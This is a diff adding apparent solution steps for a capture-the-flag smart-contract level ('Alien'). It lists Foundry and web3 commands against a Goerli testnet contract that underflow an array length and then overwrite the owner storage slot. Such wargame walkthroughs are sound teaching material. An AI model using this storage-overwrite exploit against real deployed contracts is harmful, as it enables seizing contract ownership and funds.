@@ -1,0 +1,25 @@
+1. web3.eth.getStorageAt("0x4d4D03751a287F2901aFeef830e7950bA59BfBE2", 0)
+
+2. forge create src/19Alien/Solution.sol:GetSlotLocation \
+ --rpc-url https://goerli.infura.io/v3/{key} \
+ --private-key {key} \
+ --etherscan-api-key {key} \
+ --verify 
+
+3. cast send 0x.... "retract()" \
+--rpc-url https://goerli.infura.io/v3/{key} \
+--private-key {key} 
+
+4. get storageSlot
+cast send 0x.... "getSlotWithIndex(uint256,uint256)" 1 0\
+--rpc-url https://goerli.infura.io/v3/{key} \
+--private-key {key} 
+
+5. get index
+cast send 0x.... "getIndexWithSlot(uint256)" storageSlot \
+--rpc-url https://goerli.infura.io/v3/{key} \
+--private-key {key} 
+
+6. cast send 0x.... "revise(uint256, bytes32)" index {address}\
+--rpc-url https://goerli.infura.io/v3/{key} \
+--private-key {key} 
